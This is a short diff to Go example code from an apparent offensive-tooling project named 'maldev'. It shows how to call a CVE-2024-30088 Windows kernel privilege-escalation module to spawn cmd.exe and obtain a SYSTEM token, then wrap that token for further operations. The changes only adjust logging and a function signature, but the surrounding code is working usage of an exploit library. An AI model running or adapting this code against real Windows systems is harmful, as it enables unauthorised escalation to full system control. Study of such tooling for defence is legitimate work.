@@ -440,20 +440,21 @@ package main
 import (
     "context"
     "log"
-    "os"
     "time"
-
-    slog "log/slog"
 
     "github.com/oioio-space/maldev/privesc/cve202430088"
 )
 
 func main() {
+    // The exploit's Logger field is the internal *log.Logger wrapper
+    // (no_logging-by-default in release builds). Pass nil to disable
+    // logging; consumers inside the maldev module can build a logger
+    // via internal/log.New(handler).
     cfg := cve202430088.Config{
         ExePath: `C:\Windows\System32\cmd.exe`,
         Hidden:  false,
         Timeout: 3 * time.Minute,
-        Logger:  slog.New(slog.NewTextHandler(os.Stderr, nil)),
+        Logger:  nil, // silent; or maldev-internal handler when building inside the module
     }
 
     result, err := cve202430088.RunWithExec(context.Background(), cfg)
@@ -489,8 +490,10 @@ func main() {
     }
     defer syscall.CloseHandle(result.Token)
 
-    // Wrap in win/token.Token for high-level operations
-    t := token.New(windows.Token(result.Token))
+    // Wrap in win/token.Token for high-level operations.
+    // token.New takes (windows.Token, token.Type); the SYSTEM token from
+    // the kernel exploit is a primary token.
+    t := token.New(windows.Token(result.Token), token.Primary)
     details, err := t.UserDetails()
     if err != nil {
         log.Fatal(err)
